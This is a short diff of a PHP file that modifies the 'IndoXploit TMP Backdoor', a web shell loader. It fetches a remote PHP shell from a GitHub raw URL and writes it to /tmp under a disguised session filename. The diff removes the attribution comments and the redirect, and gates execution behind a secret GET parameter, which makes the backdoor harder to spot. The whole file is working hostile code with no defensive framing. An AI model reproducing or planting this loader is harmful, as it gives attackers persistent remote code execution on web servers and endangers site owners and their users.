@@ -1,8 +1,5 @@
 <?php
-# IndoXploit TMP Backdoor
-# Bypass 406 Not Acceptable & Auto Delete Shell (WAF Evasion Shell)
-# Coded by: L0c4lh34rtz - IndoXploit
-
+if(isset($_GET["ganteng"]))
 $data = ['https://raw.githubusercontent.com/mrkronkz/shell-backdor/master/error_log.php', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
 
 if(file_exists($data[1]) && filesize($data[1]) !== 0) {
@@ -11,7 +8,7 @@ if(file_exists($data[1]) && filesize($data[1]) !== 0) {
     $fopen = fopen($data[1], 'w+');
     fwrite($fopen, get($data[0]));
     fclose($fopen);
-    echo '<script>window.location="?indoxploit";</script>';
+    
 }
 
 function get($url) {
